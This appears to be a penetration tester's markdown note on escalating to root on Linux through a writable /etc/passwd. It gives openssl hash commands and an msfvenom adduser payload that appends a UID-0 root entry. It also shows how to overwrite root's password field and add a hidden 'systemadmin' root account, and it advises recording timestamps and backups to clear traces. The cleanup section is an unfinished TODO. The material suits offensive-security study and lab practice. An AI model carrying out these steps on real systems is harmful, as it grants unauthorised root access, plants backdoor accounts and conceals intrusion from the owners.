# Living off the Land

## 01 - Detect

Weak File Permissions - Writable `/etc/passwd`.

```
$ ls -l /etc/passwd
```

## 02 - Exploit

Generate a new hash password.

```
$ openssl passwd -1 thispass123
```

For older linux systems

```
$ openssl passwd -1 -salt new thispass123
```

You can generate a payload in `msfvenom`. Before you modify the file be sure to modify the shell prompt from `/bin/sh` to `/bin/bash`.

```
$ msfvenom -p cmd/unix/adduser user=root pass=thispass123 rootmethod=SUID checksudoers=false
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 68 bytes
echo 'root:$1$Az$ObbFqO8iNmyzmcavUiQWR1:0:0::/:/bin/sh'>>/etc/passwd
```

> [!NOTE] Collect Timestamps
> Before modifying the `/etc/passwd` file. Take note of the timestamp and keep a backup copy to clear traces ahead of time.

```
$ stat /etc/passwd

$ cp /etc/passwd /tmp/passwd.bak
```

### 2.1 - Overwrite password via hash digest

Replace the letter `x` for the newly generated salt hash for the `/etc/passwd`.

```
root:x:0:0:root:/root:/bin/bash
```

Authenticate as root with the password

```
$ su root
```

### 2.2 - Create User Account

Create a new account as root with the previous generated hashed password. Here's what the format looks like:

> [!INFO]
> Replace `<new_hash>` with the hashed password.

```
systemadmin:<new_hash>:0:0:Sysadmin:/root:/bin/bash
```

## 03 - Cleanup

TODO: Fill in this info

```
$ touch
```

---
## References

- [Linux Privesc Wrong Permissions](https://wixnic.github.io/linux-privesc-wrong-permissions/)

- [Linux Privilege Escalation Writable Passwd File](https://steflan-security.com/linux-privilege-escalation-writable-passwd-file/)